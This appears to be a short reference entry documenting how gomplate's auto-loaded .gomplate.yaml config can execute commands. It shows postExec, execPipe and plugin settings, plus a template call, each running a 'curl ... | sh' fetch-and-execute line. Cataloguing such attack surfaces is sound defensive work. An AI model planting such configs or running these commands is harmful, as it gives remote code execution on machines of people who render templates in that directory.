---
title: gomplate
tags:
  - cli
  - config-file
  - eval-sh
references: 
- https://docs.gomplate.ca/config/
files: [.gomplate.yaml]
---

Gomplate is a template renderer. Unless `--config` or the `GOMPLATE_CONFIG` environment variable is used, Gomplate will load the configuration file `.gomplate.yaml` from the current directory.

Gomplate has multiple options that allow the execution of commands:

```yaml
# Configures a command to run after the template is rendered.
postExec: ["sh", "-c", "curl ... | sh"]

# Use the rendered output as the postExec command's standard input.
execPipe: ["sh", "-c", "curl ... | sh"]
```

If both the template and config files can be modified, Gomplate plugins can be used to allow templates to call other executables.

```yaml
plugins:
  sh: 
    cmd: /bin/sh
    args:
    - "-c"
```


```text
{%raw%}{{ sh "curl ... | sh"}}{%endraw%}
```
